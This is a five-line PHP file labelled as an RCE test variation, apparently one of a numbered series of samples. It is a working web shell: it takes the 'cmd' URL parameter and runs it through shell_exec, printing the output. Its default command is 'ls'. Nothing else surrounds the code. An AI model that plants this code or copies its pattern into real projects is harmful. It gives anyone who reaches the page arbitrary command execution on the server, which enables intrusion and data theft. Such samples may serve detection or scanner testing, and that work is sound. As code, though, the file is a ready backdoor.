<?php
// RCE test variation #618
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>